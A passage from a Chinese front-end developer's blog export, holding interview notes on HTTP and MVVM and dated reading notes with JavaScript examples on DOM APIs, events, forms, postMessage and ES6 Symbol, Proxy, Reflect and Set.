GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息 GET参数通过URL传递，POST放在Request body中 1xx 指示信息-请求已接收，继续处理 2xx 成功 3xx 重定向 4xx 客户端错误 5xx 服务器错误 200 OK 206 客户端发送了一个带有Range头的GET请求，服务器完成了它 301 请求页面已经转移至新的url 302 页面已经临时转移至新的url 304 原来缓存的文档还可以继续使用 400 客户端请求有语法错误，不能被服务器理解 401 请求未授权 403 访问被禁止 404 资源不存在 500 服务发生不可预期的错误 503 请求完成，服务器临时过载或宕机 持久连接HTTP协议采用“请求-应答”模式，当使用普通模式，即非keep-alive模式时，每个请求和服务器都要新建一个链接，完成后立即断开连接（HTTP协议为无连接的协议） 当使用keep-alive模式（又称持久连接、连接重用）时，keep-alive功能是客户端到服务器端的连接持续有效，当出校对服务器的后继请求时，keep-alive功能避免了建立或者重新建立连接 管线化在使用持久连接的情况下，某个链接上消息的传递类似于请求1 -&gt; x响应1 -&gt; 请求2 -&gt; 响应2 管线化，在持久连接的基础上，类似于请求1 -&gt; 请求2 -&gt; 响应1 -&gt; 响应2 管线化特点： 管线化机制通过持久化完成，仅HTTP/1.1支持 只有GET和HEAD请求可以进行管线化，而POST有所限制 管线化不会影响响应到来的顺序 服务器端支持管线化，并不要求服务器端也对响应进行管线化处理，只是要求对于管线化的请求不失败 遇到的问题：递归应用内存泄漏，原生对象和DOM对象相互引用导致内存泄漏 MVVM了解MVVM框架吗？用过vue.js 聊vue.js有哪些优点，缺点？ React和Vue相似之处： 使用Virtual DOM 提供了响应式（Reactive）和组件化（Composable）的视图组件 将注意力集中保持在和核心库，而将其他功能如路由和全局状态交给相关的库 不同之处： React有更丰富的生态系统 React在某个组件状态发生变化时，它会以该组件为根，重新渲染整个组件子树，而Vue自动追踪，精确知晓哪个组件需要被重渲染 React渲染功能依靠JSX，支持类型检查、编译器自动完成，linting，Vue默认推荐的还是模板 CSS作用域在React中是通过CSS-in-JS方案实现，Vue设置样式的默认方法时单文件组件里类似style的标签 编写有本地渲染能力的APP，React有React Native，比较成熟。Vue有Weex，还在快速发展中 收住优点，攒着下面说 对MVVM的认识1. 先聊一下MVCMVC：Model（模型） View（视图） Controller（控制器），主要是基于分层的目的，让彼此的职责分开。 View通过Controller和Model联系，Controller是View和Model的协调者，view和Model不直接联系，基本联系都是单向的。 2. 顺带提下MVPMVP：是从MVC模式演变而来的，都是通过Controller/Presenter负责逻辑的处理+Model提供数据+View负责显示。 在MVP中，Presenter完全把View和Model进行分离，主要的程序逻辑在Presenter里实现。并且，Presenter和View是没有直接关联的，是通过定义好的接口进行交互，从而使得在变更View的时候可以保持Presenter不变。 3. 再聊聊MVVNMVVM：Model + View + ViewModel，把MVC中的Controller和MVP中的Presenter改成ViewModel view的变化会自动更新到ViewModel，ViewModel的变化也会自动同步到View上显示。这种自动同步是因为ViewModel中的属性实现了Observer，当属性变更时都能触发对应操作。 View 是HTML文本的js模板； ViewModel是业务逻辑层（一切js可视业务逻辑，比如表单按钮提交，自定义事件的注册和处理逻辑都在viewmodel里面负责监控俩边的数据）； Model数据层，对数据的处理（与后台数据交互的增删改查） 提一下我熟悉的MVVM框架：vue.js，Vue.js是一个构建数据驱动的 web 界面的渐进式框架。Vue.js 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。核心是一个响应的数据绑定系统。 4. 一句话总结下不同之处MVC中联系是单向的，MVP中P和V通过接口交互，MVVM的联系是双向的 双向数据绑定原理 Object.defineProperty用法熟记于心 Object.defineProperty与Reflect.defineProperty区别Reflect.defineProperty返回的是boolean值 MVVM设计模式这个回顾一下自己写的文章]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[daily reading note]]></title>
    <url>%2F2018%2F08%2F27%2Fdaily%20reading%20note%2F</url>
    <content type="text"><![CDATA[记录日常看书、看博客小记DOM2 DOM3有关属性检测节点是否相等 isSomeNode isEqualNode 123456div1 = document.createElement(&quot;div&quot;);div2 = document.createElement(&quot;div&quot;);div1.isSameNode(div1); // truediv1.isSameNode(div2); // falsediv1.isEqualNode(div2); // true 获取框架文档对象 contentDocument contentWindow 12var iframe = document.getElementById(&quot;myIframe&quot;);var iframeDoc = iframe.contentDocument || iframe.contentWindow.document; 获取行间样式遇到float要用styleFloat 1myDiv.styleFloat = &quot;left&quot;; 几个重要样式属性和方法 cssText length item(index) getPropertyValue(propertyName) removeProperty(propertyName) setProperty(propertyName, value, priority) 123456789var demo = document.getElementById(&quot;demo&quot;);var prop, val, i, len;for(var i = 0, len = demo.style.length; i &lt; len; i++) &#123; prop = demo.style[i]; val = demo.style.getPropertyValue(prop); console.log(prop, val);&#125; 计算样式 computedStyleie9-使用oDiv.currentStyle123var computedStyle = document.getComputedStyle(oDiv, null);var bl = computedStyle.borderLeftStyle; 对样式表操作 12345var sheet = null;for(var i = 0, len = document.styleSheets.length; i++) &#123; sheet =document.styleSheets[i]; console.log(sheet.href);&#125; 123456var sheet = document.styleSheets[0];var rules = sheet.cssRules || sheet.rules;var value = rules[0];rule.style.backgroundColor = &quot;red&quot;;// 插入一条样式到样式表sheet.insertRule(&quot;body&quot;, &quot;background-color:red;&quot;, 0); ——2017/11/24 样式相关偏移量 offsetHeight = 元素高度 + （可见）水平滚动条高度 + 上边框高度 + 下边框高度； offsetWidth = 元素宽度 + （可见）垂直滚动条宽度 + 左边框高度 + 右边框高度； offsetLeft = 元素左边框至包含元素的左内边框之间的像素距离； offsetTop = 元素上边框至包含元素的上内边框之间的像素距离； 123456789101112// 想知道某个元素再页面上的偏移量function getElementLeft(ele) &#123; var actualLeft = ele.offsetLeft; var current = ele.offsetParent; while(current !== null) &#123; actualLeft += current.offsetLeft; current = current.offsetParent; &#125; return actualLeft;&#125; 客户区大小 clientWidth = 元素内容区宽度 + 左右内边距宽度； clientHeight = 元素内容区高度 + 左右内边距高度； 滚动大小 scrollHeight: 在没有滚动条的情况下，元素内容的总高度； scrollWidth: 在没有滚动条的情况下，元素内容的总宽度； scrollLeft: 被隐藏在内容区域左侧的像素数。通过设置这个属性可以改变元素的滚动位置。 scrollTop: 被隐藏在内容区域上方的像素数。通过设置这个属性可以改变元素的滚动位置。 PS：在不包含滚动条的页面而言，scrollWidth与clientWidth，scrollHeight与clientHeight的关系并不是十分清晰。 Firefox，这两组属性始终相等，但大小代表的是文档内容区域的实际尺寸，而非视口尺寸； Oprea、safari、chrome中这两组属性有差别，其中scrollWidth和scrollHeight等于视口大小，而clientWidth和clientHeight等于文档区域大小； IE，这两组属性不相等，scrollHeight和scrollWidth等于文档内容区域大小，而clientHeight和clientWidth等于视口大小； 所以，我们一般采用获取最大值，保证跨浏览器准确： 1var docHeight = Math.max(document.documentElement.scrollHeight, doucument.documentElment.clientHeight); 确定元素大小 getBoundingClientRect()方法，返回一个对象，包括四个属性：left、top、right和bottom。这些属性给出了元素相对视口的位置。 ——2017/11/26 范围 selectNode() 选择整个节点 selectNodeContents() 只选择节点的子节点 html1&lt;p id=&quot;p1&quot;&gt;&lt;b&gt;Hello&lt;/b&gt;World!&lt;/p&gt; js 12345678910var p1 = document.getElementById(&quot;p1&quot;), helloNode = p1.firstChild.firstChild, worldNode = p1.lastChild, range = document.createRange();var span = document.createElement(&quot;span&quot;);span.style.color = &quot;red&quot;;range.selectNode(helloNode); // 选择整个节点range.surroundContents(span); // 包含选择的节点 123456range.deleteContents(); // 删除范围选区var fragment = range.extractContents(); // 移除范围选区，返回文档片段var fragment = range.cloneContents(); // 赋值范围选区span.appendChild(document.createTextNode(&quot;Inserted Text&quot;));range.insertNode(span); // 在选区前插入一个节点 事件为了兼容所有浏览器，一般对元素添加、删除事件做如下处理（不过一般IE9+都没有必要这么做） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192var EventUtil = &#123; // 添加事件 addHandler: function(element, type, handler) &#123; if(element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if(element.attachEvent) &#123; element.attachEvent(&quot;on&quot; + type, handler); &#125; &#125;, // 获取事件对象 getEvent: function(ev) &#123; return ev ? ev : window.event; &#125;, // 获取事件目标 getTarget: function(ev) &#123; return ev.target || ev.srcElement; &#125;, // 阻止默认事件 preventDefault: function(ev) &#123; if(ev.preventDefault) &#123; ev.preventDefault(); &#125; else &#123; ev.returnValue = false; &#125; &#125;, // 移除事件 removeHandler: function(element, type, handler) &#123; if(element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if(element.detachEvent) &#123; element.detachEvent(&quot;on&quot; + type, handler); &#125; &#125;, // 阻止冒泡 stopPropagation: function(ev) &#123; if(ev.stopPropagation) &#123; ev.stopPropagation(); &#125; else &#123; ev.cancelBubble = true; &#125; &#125;, // 获取相关元素 getRelatedTarget: function(ev) &#123; if(ev.relatedTarget) &#123; return ev.relatedTarget; &#125; else if(ev.toElement) &#123; return ev.toElement; &#125; else if(ev.fromElement) &#123; return ev.fromElement; &#125; &#125;, // 获取鼠标滚动 getWheelDelta: function(ev) &#123; // 其他 对应mousewheel事件 if(ev.wheelDelta) &#123; return ev.wheelDelta; &#125; // 兼容Firefox 对应DOMMouseScroll else &#123; return -ev.detail * 40; &#125; &#125;, // 获取keypress按下键字符的ASCLL码 getCharCode: function(ev) &#123; if(typeof ev.charCode == &quot;number&quot;) &#123; return ev.charCode; &#125; else &#123; return ev.keyCode; &#125; &#125;, // 获取剪贴板数据 getClipboardText: function(ev) &#123; var clipboardData = (event.clipboardData || window.clipboardData); return clipboardData.getData(&quot;text&quot;); &#125;, // 设置剪贴板数据 setClipboardText: function(ev, value) &#123; if(ev.clipboardData) &#123; return event.clipboardData.setData(&quot;text/plain&quot;, value); &#125; else if(window.clipboardData)&#123; return window.clipboardData.setData(&quot;text&quot;, value); &#125; &#125;&#125;; 扫盲：以前认为在页面卸载的时候没有办法去控制，当初没有注意到window下的beforeunload事件 12345EventUtil.addHandler(window, &quot;beforeunload&quot;, function(ev) &#123; var msg = &quot;before unload?&quot;; ev.returnValue = &quot;before unload?&quot;; return &quot;before unload ?&quot;;&#125;); 新认识一个事件，DOMContentLoaded事件在形成完整的DOM数之后就触发，不会理会图片、JavaScript文件、css文件或其他资源是否已经下载完毕。 —— 2017/11/27 自定义事件123456789101112131415EventUtil.addHandler(selfBtn, &quot;myEvent&quot;, function(ev) &#123; ev = EventUtil.getEvent(ev); console.log(&quot;btn myEvent:&quot;, ev.detail);&#125;);EventUtil.addHandler(document, &quot;myEvent&quot;, function (ev) &#123; ev = EventUtil.getEvent(ev); console.log(&quot;document myEvent:&quot;, ev.detail);&#125;);var event = document.createEvent(&quot;CustomEvent&quot;);event.initCustomEvent(&quot;myEvent&quot;, true, false, &quot;hello my event&quot;);selfBtn.dispatchEvent(event); —— 2017/12/6 表单form表单作为一种古老的数据提交方式，很多细节还真是头回见，下面小记下。 1234567891011121314&lt;form action=&quot;http://xxx.com&quot; method=&quot;post&quot; id=&quot;form1&quot;&gt; &lt;p&gt; &lt;label&gt;姓名：&lt;/label&gt; &lt;input type=&quot;text&quot; value=&quot;&quot; id=&quot;username&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;label&gt;性别：&lt;/label&gt; &lt;input type=&quot;text&quot; value=&quot;&quot; id=&quot;username&quot;&gt; &lt;select name=&quot;gender&quot;&gt; &lt;option value=&quot;0&quot;&gt;男&lt;/option&gt; &lt;option value=&quot;1&quot;&gt;女&lt;/option&gt; &lt;/select&gt; &lt;/p&gt;&lt;/form&gt; 123var forms = document.forms // 获取页面中所有form集合var firstForm = document.forms[0]; // 索引获取表单var form1 = document.forms[&quot;form1&quot;]; // 根据名称获取表单 单击一下代码生成的按钮，可以提交表单 123&lt;input type=&quot;submit&quot; value=&quot;Submit form&quot;&gt;&lt;button type=&quot;submit&quot; &gt;Submit form&lt;/button&gt;&lt;input type=&quot;image&quot; src=&quot;demo.png&quot;&gt; 这种方式提交表单，浏览器会将请求发送到服务器之前触发submit事件。 123var form = document.querySelector(&quot;form&quot;);var firstField = form.elements[0];var field1 = form.elements[&quot;name&quot;]; 除了元素外，所有表单字段拥有相同的一组属性：disabled、form、name、readonly、tabIndex、type、value。 值得注意的是，对value属性所做的修改，不一定会反映在DOM中，因此，在处理文本框的值时，最好不要使用DOM方法。 为解决不知道用户选择了什么文本的困扰，新认识了两个属性：selectionStart、selectionEnd。 12345678$name.addEventListener(&quot;select&quot;, function(ev) &#123; if(typeof $name.selectionStart == &quot;number&quot;) &#123; console.log($name.value.substring($name.selectionStart, $name.selectionEnd)); &#125; else if(document.selection) &#123; // IE8- console.log(document.selection.createRange().text); &#125;&#125;); 设置选中部分文本解决方案：setSelectionRange 123$name.value = &quot;hello form&quot;;$name.setSelectionRange(0, 4); // hel$name.focus(); 复制&amp;&amp;粘贴问题解决方案：event.clipboardData/window.clipboardData获取到clipboardData对象，有setData和getData方法。只有opera不支持。Firefox、safari和chrome只允许在paste事件发生时读取剪贴板数据，而ie没有这个限制。 以前对select的操作过于依赖jQuery或者DOM操作，其实本身有些很好的方法和属性。HTMLSelectElement提供的一些属性和方法： add(newOption, relOption)：向控件中插入新元素，其位置在相关项relOption之前。 multiple：是否允许多项选择。 options：控件中所有元素的HTMLCollection。 remove(index)：移除给定位置的选项。 selectedIndex：基于0的选中项索引，没有选中项，返回-1.对于多选项，只返回选中项中的第一项索引。 size：选择框中可见行数。 HTMLOptionElement有一下属性： index：当前选项在options集合中的索引。 label：当前选项的标签。 selected：当前选项是否被选中。将这个属性设置位true可以选中当前选项。 text：选项的文本。 value：选项的值。 1234567&lt;select name=&quot;is-student&quot; id=&quot;is-student&quot;&gt; &lt;option value=&quot;0&quot;&gt;否&lt;/option&gt; &lt;option value=&quot;1&quot;&gt;是&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;不清楚&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;不明白&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;不知道&lt;/option&gt;&lt;/select&gt; 123456789101112131415options = $isStudent.options;// 将第四位置上的option元素插入到第二位前面$isStudent.add(options[3], options[1]);// 移除第五位option元素$isStudent.remove(4);// 将第三项选中options[2].selected = true;console.log(&quot;选中了的项索引：&quot;, $isStudent.selectedIndex); // 2console.log(&quot;选中项的文本：&quot;, options[$isStudent.selectedIndex].text); // 是console.log(&quot;选中项的标签：&quot;, options[$isStudent.selectedIndex].label); // 是console.log(&quot;选中项的在options集合中的索引：&quot;, options[$isStudent.selectedIndex].index); // 2 —— 2017/12/8 typeof undefined以前总迷惑，为嘛能够直接 1if(aaa === undefined) 看到别人偏偏 1if(typeof aaa == &quot;undefined&quot;) 今天才明白其中道理：因为在js中undefined可以被重写，这样防止页面中有undefined变量存在。下面来看看区别： 1234567891011(function(undefined) &#123; var a; console.log(&quot;test1: &quot;, a === undefined); // false console.log(&quot;test1: &quot;, &quot;abc&quot; === undefined); // true&#125;)(&quot;abc&quot;);(function(undefined) &#123; // var a; console.log(&quot;test2: &quot;, typeof a === &quot;undefined&quot;); // true console.log(&quot;test2: &quot;, &quot;abc&quot; === undefined); // true&#125;)(&quot;abc&quot;); 作用于安全构造函数构造函数其实是一个使用new操作符调用的函数。当使用new调用时，构造函数内用到的this对象会指向新创建的对象实例。 12345678function Person(name, age) &#123; this.name = name; this.age = age;&#125;var person = new Person(&quot;wuwh&quot;, &quot;22&quot;);console.log( person.name );console.log( person.age ); 如果构造函数被当作普通函数调用，this就会指向window对象，添加成window下的属性。 123var person = Person(&quot;wuwh&quot;, &quot;22&quot;);console.log(window.name);console.log(window.age); 解决这个问题的方法时创建一个作用域安全的构造函数，原理是在进行任何更改前，确认this对象是指向正确的实例。 123456789function Person(name, age) &#123; if(this instanceof Person) &#123; this.name = name; this.age = age; &#125; else &#123; return new Person(name, age); &#125;&#125; —— 2017/12/9 HTML5原生APIXDM 跨文档消息传送（XDM）,HTML5原生提供了postMessage方法。 postMessage()方法接收两个参数： 一条消息 一个表示消息接收方来自哪个域下的字符串 1234var frameWindow = document.querySelector(&quot;iframe&quot;).contentWindow;setTimeout(function() &#123; frameWindow.postMessage(&quot;hello&quot;, &quot;http://localhost&quot;);&#125;, 1000); 接收到XDM消息时，会触发window对象的message事件，改事件会包含三个重要信息： data：postMessage()第一个参数； origin：发送消息的文档所在的域； source：发送消息的文档window对象的代理，用于发送上一条消息的窗口中调用postMessage()。 1234567// 接收XDM消息window.addEventListener(&quot;message&quot;, function(ev) &#123; console.log(&quot;ev.origin:&quot;, ev.origin); console.log(&quot;ev.data:&quot;, ev.data); console.log(&quot;ev.source:&quot;, ev.source); ev.source.postMessage(&quot;Received!&quot;, &quot;http://localhost&quot;);&#125;); 拖放事件 在被拖动元素上依次触发事件： dragstart drag dragend 在防止目标上依次触发事件： dragenter dragover dragleave drop为了阻止默认行为，一般都要对dragenter、dragover和drop绑定阻止默认事件。 认识一个新的事件属性dataTransfer，用于从被拖放元素向放置目标传递字符串格式的数据。 123456789// 设置文本和url数据ev.dataTransfer.setData(&quot;URL&quot;, location.href);ev.dataTransfer.setData(&quot;text&quot;, &quot;hello drag&quot;);// 接收文本和url数据console.log(&quot;dataTransfer url:&quot;, dataTransfer.getData(&quot;URL&quot;) || dataTransfer.getData(&quot;text/uri-list&quot;));console.log(&quot;dataTransfer text:&quot;, dataTransfer.getData(&quot;text&quot;));console.log(&quot;dataTransfer file:&quot;, dataTransfer.file); —— 2017/12/9 高级函数惰性载入函数 有时候对浏览器的检测，我们执行一次就行，不必每次调用进行分支检测。解决方案就是惰性载入。 在第一次调用过程中，该函数被覆盖为另一个合适方式执行的函。 1234567891011121314function createXHR() &#123; if(typeof XMLHttpRequest != &quot;undefined&quot;) &#123; createXHR = function() &#123; return new XMLHttpRequest(); &#125; &#125; else if(typeof ActiveXObject != &quot;undefined&quot;) &#123; createXHR = function() &#123; return new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;); &#125; &#125; return createXHR();&#125; 函数声明时就自执行指定恰当的函数。 1234567891011121314var createXHR = (function () &#123; if(typeof XMLHttpRequest != &quot;undefined&quot;) &#123; createXHR = function() &#123; return new XMLHttpRequest(); &#125; &#125; else if(typeof ActiveXObject != &quot;undefined&quot;) &#123; createXHR = function() &#123; return new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;); &#125; &#125; return createXHR();&#125;)(); 函数绑定 指定一个函数内this环境，ES5原生可以用bind，bind实现原理时这样的： 12345function bind(fn, context) &#123; return function() &#123; fn.apply(context, arguments); &#125;&#125; bind一般用于事件处理程序以及setTimeout()和setInterval()。因为这些直接用函数名，函数体内this时分别指向元素和window的。 函数柯里化 上面模拟绑定函数的实现，发现不能传参。于是，对绑定函数进行传参处理叫做函数柯里化。 实现可以传参的bind函数。 12345678function bind(fn, context) &#123; var args = Array.prototype.slice.call(arguments); return function() &#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return fn.apply(context, finalArgs); &#125;&#125; 防止篡改对象 Object.preventExtensions() 防止给对象添加新属性和方法。 123456var person = &#123; name: &quot;wuwh&quot;&#125;;Object.preventExtensions(person);person.age = 22;console.log(person.age); // undefined Object.seal() 防止删除对象属性和方法。 123456var person = &#123; name: &quot;wuwh&quot;&#125;;Object.seal(person);delete person.name;console.log(person.name); // wuwh Object.freeze() 冻结对象，既不可以拓展，也不可以密封，还不可以修改。 12345678910var person = &#123; name: &quot;wuwh&quot;&#125;;Object.freeze(person);person.age = 22;console.log(person.age); // undefineddelete person.name;console.log(person.name); // wuwhperson.name = &quot;xiohua&quot;;console.log(person.name); // wuwh 定时器 理解这段话就明白为什么setInterval要谨慎使用了。 使用setInterval()创建的定时器确保了定时器代码规则地插入到队列中。问题在于，定时器代码可能在被添加到队列之前还没有完成执行，结果导致定时器代码运行好几次，而之间没有停顿。在这里js引擎避免了这个问题。当时用setInterval()时，仅当没有该定时器的任何其他代码实例时，才将定时器代码添加到队列中。确保了定时器代码加入到队列地最小时间间隔为指定间隔。 造成后果：(1)某些间隔被跳过；(2)多个定时器地代码执行之间地间隔可能会比预期地小。 —— 2017/12/13 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129/**自定义事件基于观察者设计模式* handlers = &#123;* type1: [eventFn1_1, event1_2, ...],* type2: [eventFn2_1, event2_2, ...]*&#125;*/function EventTarget() &#123; this.handlers = &#123;&#125;;&#125;EventTarget.prototype = &#123; constructor: EventTarget, // 添加一个自定义事件 addHandler: function(type, handler) &#123; if(typeof this.handlers[type] == &quot;undefined&quot;) &#123; this.handlers[type] = []; &#125; this.handlers[type].push(handler); &#125;, // 遍历执行自定义事件程序 fire: function(ev) &#123; if(!ev.target) &#123; ev.target = this; &#125; if(this.handlers[ev.type] instanceof Array) &#123; var handlers = this.handlers[ev.type]; for(var i = 0, len = handlers.length; i &lt; len; i++) &#123; handlers[i](ev); &#125; &#125; &#125;, // 移除一个自定义事件程序 removeHandler: function(type, handler) &#123; if(this.handlers[type] instanceof Array) &#123; var handlers = this.handlers[type]; for(var i = 0, len = handlers.length; i &lt; len; i++) &#123; if(handlers[i] === handler) &#123; handlers.splice(i, 1); break; &#125; &#125; &#125; &#125;&#125;var DragDrop = function (selector) &#123; var dragdrop = new EventTarget(); var draging = null, diffX = 0, diffY = 0; var target = document.querySelector(selector); function handleEvent(ev) &#123; switch (ev.type) &#123; case &quot;mousedown&quot;: draging = target; diffX = ev.clientX - draging.offsetLeft; diffY = ev.clientY - draging.offsetTop; // 触发自定义事件 dragdrop.fire(&#123; type: &quot;dragstart&quot;, target: draging, x: ev.clientX, y: ev.clientY &#125;); break; case &quot;mousemove&quot;: if (draging !== null) &#123; draging.style.left = (ev.clientX - diffX) + &quot;px&quot;; draging.style.top = (ev.clientY - diffY) + &quot;px&quot;; &#125; // 触发自定义事件 dragdrop.fire(&#123; type: &quot;drag&quot;, target: draging, x: ev.clientX, y: ev.clientY &#125;); break; case &quot;mouseup&quot;: case &quot;mouseout&quot;: // 触发自定义事件 dragdrop.fire(&#123; type: &quot;dragend&quot;, target: draging, x: ev.clientX, y: ev.clientY &#125;); draging = null; break; &#125; ev.stopPropagation(); &#125; // 单例提供出去的公共接口 dragdrop.enable = function () &#123; target.addEventListener(&quot;mousedown&quot;, handleEvent, false); target.addEventListener(&quot;mousemove&quot;, handleEvent, false); target.addEventListener(&quot;mouseup&quot;, handleEvent), false; target.addEventListener(&quot;mouseout&quot;, handleEvent), false; &#125;; dragdrop.disable = function () &#123; target.removeEventListener(&quot;mousedown&quot;, handleEvent); target.removeEventListener(&quot;mousemove&quot;, handleEvent); target.removeEventListener(&quot;mouseup&quot;, handleEvent); &#125; return dragdrop;&#125;;var dg = DragDrop(&quot;#drag&quot;);dg.addHandler(&quot;drag&quot;, function(ev) &#123; console.log(ev.x);&#125;);dg.enable(); —— 2017/12/14 ES6之SymbolSymbol是ES6中引入的一个第七种数据类型（前六种分别是undefined、null、Boolean、String、Number、Object）。目的是使得属于Symbol类型的属性都是独一无二的，可以保证不与其他属性名产生冲突。 Symbol函数相同入参，返回值不相等 123let sym1 = Symbol(&quot;my symbol&quot;);let sym2 = Symbol(&quot;my symbol&quot;);console.log(sym1 == sym2); // false Symbol值不能和其他类型的值进行运算，包括自身。但是可以显示转化成字符串，也可以转化成布尔值 1234let sym = Symbol(&quot;my symbol&quot;);console.log(Boolean(sym));console.log(sym.toString()); // Symbol(my symbol)console.log(sym + &quot;.gif&quot;); // Uncaught TypeError Symbol值作为对象属性 1234567891011121314let mySymbol = Symbol();let a = &#123;&#125;;a[mySymbol] = &quot;Hello&quot;;console.log(&quot;a:&quot;, a);let b = &#123; [mySymbol]: &quot;Hello&quot;&#125;;console.log(&quot;b:&quot;, b);let c = &#123;&#125;;Object.defineProperty(c, mySymbol, &#123;value: &quot;Hello&quot;&#125;);console.log(&quot;c:&quot;, c); 获取对象所有Symbol属性名 12345678910111213const obj = &#123;&#125;;let a = Symbol(&quot;a&quot;);let b = Symbol(&quot;b&quot;);obj[a] = &quot;Hello&quot;;obj[b] = &quot;World&quot;;const objSymbols = Object.getOwnPropertySymbols(obj);console.log(&quot;Object.getOwnPropertySymbols(obj):&quot;, Object.getOwnPropertySymbols(obj)); // [Symbol(a), Symbol(b)]console.log(&quot;Object.getOwnPropertyNames(obj):&quot;, Object.getOwnPropertyNames(obj)); // []console.log(&quot;Reflect.ownKeys(obj):&quot;, Reflect.ownKeys(obj)); // [Symbol(a), Symbol(b)] Symbol.for() 搜索返回已有参数名称的Symbol值，没有则会新建以改字符串为名称的Symbol值 123456let s1 = Symbol.for(&quot;foo&quot;);let s2 = Symbol.for(&quot;foo&quot;);console.log(&quot;symbol for s1 == s2:&quot;, s1 === s2);// Symbol.keyFor 返回已登记Symbol类型值的keyconsole.log(Symbol.keyFor(s1)); // fooconsole.log(Symbol.keyFor(Symbol(&quot;aaa&quot;))); // undefined Symbol.for登记的名字是全局环境的 123456let iframe = document.createElement(&quot;iframe&quot;);iframe.src = location.href;document.body.appendChild(iframe);console.log(iframe.contentWindow.Symbol.for(&quot;foo&quot;) === window.Symbol.for(&quot;foo&quot;)); ES6之ProxyProxy属于一种“元编程”，即对编程语言进行编程。可以理解成在木匾对象之前架设一层“拦截” 12345678let proxy = new Proxy(&#123;&#125;, &#123; get: function(target, property) &#123; return &quot;wuwh&quot;; &#125;&#125;);console.log(proxy.time); // wuwhconsole.log(proxy.name); // wuwh Proxy实例可以作为其他对象的原型对象 12345678let proxy = new Proxy(&#123;&#125;, &#123; get: function(target, property) &#123; return &quot;wuwh&quot;; &#125;&#125;);let obj = Object.create(proxy);console.log(proxy.time); Proxy的一些实例方法 123456789101112131415161718192021222324let handler = &#123; get: function(target, name) &#123; if(name === &quot;prototype&quot;) &#123; return Object.prototype; &#125; return &quot;Hello, &quot; + name; &#125;, apply: function(target, thisBinding, args) &#123; return args[0]; &#125;, construct: function(target, args) &#123; return &#123;value: args[1]&#125;; &#125;&#125;;var fproxy = new Proxy(function(x, y) &#123; return x + y;&#125;, handler);console.log(fproxy(1, 2)); // 1 被apply拦截console.log(new fproxy(1, 2)); // &#123;value: 2&#125; 被construct拦截console.log(fproxy.time); // Hello, time 被get拦截 writable和configurable属性都为false时，则该属性不能被代理，通过 Proxy 对象访问该属性会报错 12345678910111213141516let obj = &#123;&#125;; Object.defineProperty(obj, &quot;foo&quot;, &#123; value: 123, writable: false, configurable: false &#125;); const handler = &#123; get: function(target, propKey) &#123; return &quot;wuwh&quot;; &#125; &#125;; const proxy = new Proxy(obj, handler); console.log(proxy.foo); —— 2017/12/15 ES6之ReflectReflect对象与Proxy对象一样，也是ES6为了操作对象提供的新API。 Reflect对象一共有 13 个静态方法。 Reflect.apply(target, thisArg, args) Reflect.construct(target, args) Reflect.get(target, name, receiver) Reflect.set(target, name, value, receiver) Reflect.defineProperty(target, name, desc) Reflect.deleteProperty(target, name) Reflect.has(target, name) Reflect.ownKeys(target) Reflect.isExtensible(target) Reflect.preventExtensions(target) Reflect.getOwnPropertyDescriptor(target, name) Reflect.getPrototypeOf(target) Reflect.setPrototypeOf(target, prototype) Reflect.get &amp;&amp; Reflect.set 在name属性部署了读取函数（getter）或者是设置函数（setter），this绑定receiver1234567891011121314var obj = &#123; foo: 1, set bar(value) &#123; return this.foo = value; &#125;&#125;;var receiveObj = &#123; foo: 5&#125;Reflect.set(obj, &quot;bar&quot;, 3, receiveObj);console.log(&quot;obj.bar:&quot;, obj.foo);console.log(&quot;receiveObj.bar:&quot;, receiveObj.foo); 如果Proxy对象和Reflect对象联合使用，前者拦截赋值操作，后者完成赋值的默认行为，而且传入receiver，那么Reflect.set会触发Proxy.defineProperty12345678910111213141516var obj = &#123; name: &quot;wuwh&quot;&#125;;var loggedObj = new Proxy(obj, &#123; set: function(target, key, value, receiver) &#123; console.log(&quot;set...&quot;); Reflect.set(target, key, value, receiver); &#125;, defineProperty(target, key, attribute) &#123; console.log(&quot;defineProperty...&quot;); Reflect.defineProperty(target, key, attribute); &#125;&#125;);loggedObj.name = &quot;xiaohua&quot;; // set... defineProperty... Reflect.constructor(target, args) 123456789function Geeting(name) &#123; this.name = name;&#125;// new 的写法const instance = new Greeting(&quot;张三&quot;);// Reflect.construct的写法const instance = Reflect.construct(Greeting, [&quot;张三&quot;]); Reflect.getPrototypeOf(obj) &amp;&amp; Reflect.setPrototypeOf(obj, newProto) 设置和读取对象的proto属性 12345678910function FancyThing() &#123;&#125;const myObj = new FancyThing();const obj = &#123; constructor: FancyThing, name: &quot;wuwh&quot;&#125;;Reflect.setPrototypeOf(myObj, obj);console.log(Reflect.getPrototypeOf(myObj)); // obj Reflect.ownKeys123456789101112var obj = &#123; foo: 1, bar: 2, [Symbol.for(&quot;foo&quot;)]: 3, [Symbol.for(&quot;baz&quot;)]: 4&#125;;console.log(Object.getOwnPropertyNames(obj)); // [&quot;foo&quot;, &quot;bar&quot;]console.log(Object.getOwnPropertySymbols(obj)); // [Symbol(foo), Symbol(baz)]console.log(Reflect.ownKeys(obj)); // [&quot;foo&quot;, &quot;bar&quot;, Symbol(foo), Symbol(baz)] ES6之Set和Mapset Set是ES6新数据结构，类似于数组，但是成员都是唯一的，没有重复的值 12345678var s = new Set();[1, 2, 3, 4, 5, 1, 2, 3].forEach(function(x) &#123; return s.add(x);&#125;);for(let i of s) &#123; console.log(&quot;set i:&quot;, i);&#125; 可以看成是一种数组的去重方法 变量解构 123456const set = new Set([1, 2, 3, 4, 1, 2, 3]);console.log([...set]); *//* // 在Set内部，两个NaN是相等的let set = new Set([NaN, NaN]);console.log(set); //Set 